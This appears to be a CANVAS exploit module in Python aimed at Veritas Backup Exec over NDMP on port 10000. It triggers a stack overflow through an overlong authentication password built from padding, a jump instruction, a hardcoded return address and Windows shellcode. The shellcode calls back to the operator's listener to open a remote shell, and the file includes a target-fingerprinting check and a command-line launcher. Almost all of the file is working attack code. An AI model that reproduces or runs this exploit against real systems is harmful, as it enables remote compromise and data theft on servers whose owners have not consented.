#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""

Veritas Decrypt Exploit

"""

import sys
#covers both angles
sys.path.append(".")
sys.path.append("../../")
      
from exploitutils import *
from libs import ndmp
from tcpexploit import tcpexploit


DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Symantec"
DOCUMENTATION["Notes"]="Remote exploit against Veritas Backup Exec"
DOCUMENTATION["CVE Name"] = "Unknown"
DOCUMENTATION["CVE Url"] = "Unknown"

DESCRIPTION="Veritas Backup Exec stack overflow"
VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]

NAME="Veritas_Decrypt"

NOTES="""
    
"""

CHANGELOG="""

"""



class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name=NAME
        self.port=10000
        self.host=""
        self.shellcode="\xcc" * 298
        self.badstring="\x00"
        self.ssl=0
        self.setVersions()
        self.version=1

        return

    def setVersions(self):
        self.versions={}
        self.versions[1]=("Veritas ",0x1459233, 0x0) # 01459233 : jmp %ebx [beclass.dll] (beremote.exe (PID: 836))

    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]
    
    #def createShellcode(self):
        #sc = shellcodeGenerator.win32()
        ## GOFindSock and RecvExecWin32 are a match made in heaven

        #sc.addAttr("GOFindSock", {"startsock" : 0x150})
        ## RecvExec leaves active fd in esi
        #sc.addAttr("RecvExecWin32", None)
        #self.shellcode = sc.get()
        #encoder = chunkedaddencoder.intelchunkedaddencoder()
        #encoder.setbadstring(self.badstring)
        #self.log("Encoding shellcode")
        #self.shellcode = "\xcc" +encoder.encode(self.shellcode)
        #if self.shellcode == "":
            #self.log("Problem encoding shellcode")
            #return 0
        #return 1

    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        return self.createWin32Shellcode(self.badstring,host,port)
    
    
    def test(self):
        """
        for now, we just test the port to see if it is open
        """
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        nd=ndmp.NDMP(getsock=self)
        p=nd.connect( self.host)
        p=nd.getServerInfo()
        self.log("Attacking remote: %s - %s %s" % (p.VendorName, p.ProductName, \
                 p.RevisionName))
        self.log("This test is not precise at all - just a banner grabber")
        if p.VendorName.find("VERITAS") > -1:
            return 1
        return 0
    
    
    def run(self):
        """
        """
        self.host=self.target.interface
        self.port=self.argsDict.get("port",self.port)
        self.version = int(self.argsDict.get("version",self.version))

        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

               
        nd=ndmp.NDMP(getsock=self, covertness = self.covertness)
        p=nd.connect( self.host, self.port)
        p=nd.getServerInfo()

        self.log("Attacking remote: %s - %s %s" % (p.VendorName, p.ProductName, \
                 p.RevisionName))
        
        import struct
        from MOSDEF import mosdef
        password= "D" * 0xdd0
        password+= "AA" + mosdef.assemble("jmp $0x4", "X86")
        password+= struct.pack("L", self.versions[self.version][1])
        password+= self.shellcode
        password+="\x41" * (0x1550-len(self.shellcode))

        try:
            p=nd.ConnectClientAuth(3, "Hola", password)
        except timeoutsocket.Timeout:
            pass
        
        #time.sleep(1)
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d (succeeded!)"%(self.name,self.host,self.port), showlog=True)
            self.log("%s done (succeeded!)"%self.name)
            return 1
                                                                                                       
        self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port),\
                     showlog=True)
        return 0
    
def usage():
    print "Usage: "+sys.argv[0]+" -t target [-p port:2381] [-v version:1] -l localip -d localport "
    app=theexploit()
    app.displayVersions()
    sys.exit()


if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
